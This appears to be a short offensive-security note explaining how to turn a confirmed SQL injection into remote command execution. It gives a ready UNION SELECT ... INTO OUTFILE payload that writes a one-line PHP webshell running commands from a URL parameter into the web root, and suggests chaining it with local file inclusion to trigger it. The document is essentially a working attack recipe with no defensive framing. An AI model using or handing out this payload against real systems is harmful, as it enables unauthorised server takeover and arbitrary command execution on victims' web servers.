#First, we have to detect a SQLi injection point. Once we have confirmed a vulnerability through the previous steps (see strategy.txt file) we use the following SQL command to upload a webshell:

- ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- /nul/' 

# This may need a bit of customization (injection payload, number of columns, destiny path of the webshell, webshell contents, etc.). Then to finish the exploit we must access the webshell in order to trigger it so often we need to chain this SQLi with a LFI.
